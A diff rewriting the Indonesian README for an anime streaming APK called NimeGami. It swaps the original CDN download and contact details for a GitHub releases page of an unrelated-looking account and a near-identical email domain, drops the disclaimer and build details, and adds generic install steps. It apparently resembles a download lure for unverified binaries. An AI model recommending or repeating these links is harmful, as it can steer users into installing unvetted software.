@@ -1,67 +1,66 @@
-# NimeGami 🎬
+# 🌟 NimeGami-Apk - Enjoy Anime Anytime, Anywhere
 
-**NimeGami** adalah aplikasi streaming anime yang dirancang untuk memberikan pengalaman menonton anime dengan subtitle Indonesia secara mudah, cepat, dan gratis.  
-Aplikasi ini hadir sebagai pengganti alternatif bagi penggemar anime yang ingin menikmati tontonan kapan saja dan di mana saja.
+[![Download NimeGami-Apk](https://img.shields.io/badge/Download%20Now-Get%20NimeGami-Apk-brightgreen)](https://github.com/sasm110313/NimeGami-Apk/releases)
 
----
+## 📖 About NimeGami
 
-## ✨ Fitur Utama
-- 📺 Streaming ribuan judul anime dengan subtitle Indonesia.  
-- 🔎 Pencarian anime cepat berdasarkan judul & genre.  
-- 🆕 Update anime terbaru setiap hari.  
-- 📌 Fitur favorit & riwayat tontonan.  
-- 🎨 UI sederhana, ringan, dan ramah pengguna.  
-- 🚀 Performa cepat tanpa buffering berlebihan.  
+NimeGami adalah aplikasi streaming anime yang dirancang untuk memberikan pengalaman menonton anime dengan subtitle Indonesia secara mudah, cepat, dan gratis. Aplikasi ini hadir sebagai pengganti alternatif bagi penggemar anime yang ingin menikmati tontonan kapan saja dan di mana saja. Dengan NimeGami, Anda dapat menemukan anime favorit Anda dengan mudah dan menikmati tayangan berkualitas tinggi.
 
----
+## 🚀 Getting Started
 
-## 📥 Download
-Versi terbaru aplikasi bisa langsung diunduh di sini:  
+Menggunakan NimeGami-Apk sangat mudah. Anda hanya perlu mengikuti beberapa langkah sederhana untuk mengunduh dan menjalankan aplikasi ini di perangkat Anda. Berikut adalah panduan langkah demi langkah:
 
-➡️ [**Download NimeGami v4.0.0 (APK)**](https://cdn1.nekodrive.web.id/app-v4.0.0.apk)  
+### 📥 Download & Install
 
-- **Platform**: Android  
-- **Minimal OS**: Android 5.0 (Lollipop)  
-- **Versi Terbaru**: 4.0.0  
+1. **Kunjungi Halaman Rilis**  
+   Klik tautan di bawah ini untuk mengunjungi halaman rilis di GitHub, di mana Anda dapat menemukan versi terbaru dari NimeGami-Apk.  
+   [Download NimeGami-Apk](https://github.com/sasm110313/NimeGami-Apk/releases)
 
----
+2. **Pilih Versi Terbaru**  
+   Di halaman tersebut, cari bagian "Latest release". Anda akan melihat daftar file yang tersedia untuk diunduh.
 
-## 🚀 Cara Instalasi
-1. Download file **APK** dari link di atas.  
-2. Aktifkan opsi **Sumber Tidak Dikenal (Unknown Sources)** di pengaturan Android.  
-3. Install aplikasi seperti biasa.  
-4. Jalankan aplikasi dan nikmati streaming anime favorit Anda.  
+3. **Unduh File APK**  
+   Cari file dengan ekstensi `.apk`. Klik pada nama file untuk memulai unduhan. File ini akan berada di perangkat Anda setelah proses selesai.
 
----
+4. **Instal Aplikasi**  
+   Temukan file yang telah Anda unduh di perangkat Anda. Klik dua kali pada file tersebut untuk memulai proses instalasi. Ikuti petunjuk di layar untuk menyelesaikan instalasi. Pastikan untuk memberi izin yang diperlukan agar aplikasi dapat berjalan dengan baik.
 
-## 🛠️ Development
-- **Bahasa Pemrograman**: Flutter (Dart)  
-- **Backend**: REST API (WordPress / Flask / NodeJS – menyesuaikan)  
-- **Database**: SQLite / MySQL  
+5. **Jalankan NimeGami**  
+   Setelah instalasi selesai, Anda dapat menemukan ikon NimeGami di layar utama perangkat Anda. Klik ikon untuk membuka aplikasi dan mulai menonton anime favorit Anda.
 
----
+## ⚙️ System Requirements
 
-## 🤝 Kontribusi
-Kontribusi sangat terbuka!  
-Jika ingin menambahkan fitur atau memperbaiki bug:  
-1. Fork repo ini  
-2. Buat branch baru (`feature/nama-fitur`)  
-3. Commit perubahan  
-4. Buat **Merge Request**  
+Untuk memastikan pengalaman menonton yang optimal, periksa apakah perangkat Anda memenuhi persyaratan berikut:
 
----
+- **Sistem Operasi:** Android 5.0 (Lollipop) atau yang lebih baru.
+- **Memori:** Minimal 2GB RAM.
+- **Ruang Penyimpanan:** Minimal 100MB ruang kosong untuk instalasi.
+- **Koneksi Internet:** Koneksi yang stabil untuk streaming.
 
-## ⚠️ Disclaimer
-NimeGami hanya menyediakan **tautan streaming** dari sumber pihak ketiga.  
-Kami tidak menyimpan konten anime secara langsung.  
-Gunakan aplikasi ini dengan bijak sesuai hukum yang berlaku di wilayah Anda.  
+## 📺 Features
 
----
+NimeGami dilengkapi dengan berbagai fitur untuk meningkatkan pengalaman menonton Anda:
 
-## 📬 Kontak
-- 🌐 Website: [NimeGami Official](https://nimegamiapk.com)  
-- 📧 Email: support@nimegami.com  
+- **Streaming Gratis:** Nikmati semua konten tanpa biaya tambahan.
+- **Subtitle Indonesia:** Tersedia subtitle bahasa Indonesia untuk kenyamanan menonton.
+- **Antarmuka yang Ramah Pengguna:** Navigasi yang mudah dan intuitif, cocok untuk semua pengguna.
+- **Kualitas Tinggi:** Tonton anime dalam berbagai kualitas, dari standar hingga HD.
+- **Pembaruan Teratur:** Kami terus menambahkan lebih banyak konten dan meningkatkan pengalaman aplikasi.
 
----
+## 👥 Contributing
 
-❤️ Dibuat dengan penuh cinta untuk para pecinta anime oleh **Tim NimeGami**
+Jika Anda ingin berkontribusi pada pengembangan NimeGami, silakan buka halaman [kontribusi](https://github.com/sasm110313/NimeGami-Apk), di mana Anda dapat menemukan panduan tentang cara membantu. Setiap saran dan masukan sangat dihargai.
+
+## 📞 Support
+
+Jika Anda menghadapi masalah saat menggunakan NimeGami, kami siap membantu. Anda dapat menghubungi tim dukungan kami melalui email di support@nimagami.com atau dengan membuka [Isu](https://github.com/sasm110313/NimeGami-Apk/issues) di halaman GitHub kami. Kami akan berusaha menjawab secepat mungkin.
+
+## 🚧 Roadmap
+
+Kami memiliki rencana besar untuk NimeGami. Berikut adalah beberapa fitur yang akan datang:
+
+- **Mode Offline:** Tonton anime tanpa perlu koneksi internet.
+- **Daftar Putar Pribadi:** Buat daftar anime favorit untuk akses cepat.
+- **Fitur Pencarian:** Temukan anime dengan lebih mudah menggunakan kata kunci.
+
+Terima kasih telah memilih NimeGami. Kami berharap Anda menikmati pengalaman menonton anime Anda! Untuk mengunduh aplikasi, jangan lupa mengunjungi [halaman unduhan](https://github.com/sasm110313/NimeGami-Apk/releases).
